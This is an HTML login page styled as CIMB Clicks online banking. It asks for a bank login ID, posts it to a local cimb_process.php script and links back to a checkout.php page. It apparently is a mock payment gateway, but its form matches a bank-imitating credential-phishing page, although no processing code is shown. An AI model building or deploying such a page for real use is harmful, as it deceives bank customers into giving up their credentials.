<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/cimb_login.css">
</head>

<body>
    <div class="login-container">
        <div class="logo">
            <img src="assets/image/cimb_logo.png" alt="Logo 1">
        </div>
        <h3>Please enter your login credentials</h3>
        <form id="login-form" action="cimb_process.php" method="POST">
            <div class="form-group">
                <input type="text" name="login_id" id="login_id" placeholder="CIMB Clicks ID">
                <span class="cancel-icon" id="cancel-icon" style="cursor: pointer; display: none;">&#10006;</span> <!-- Cancel icon -->
                <div class="form-error" id="form-error" style="display: none;"></div>
            </div>
            <button type="submit" class="btn">Login</button>
        </form>
        <div class="back">
            <a href="checkout.php"><i class="fas fa-arrow-left"></i> Back</a> <!-- Left arrow using Font Awesome -->
        </div>
    </div>


    <script src="assets/js/cimb_login.js"></script>
</body>

</html>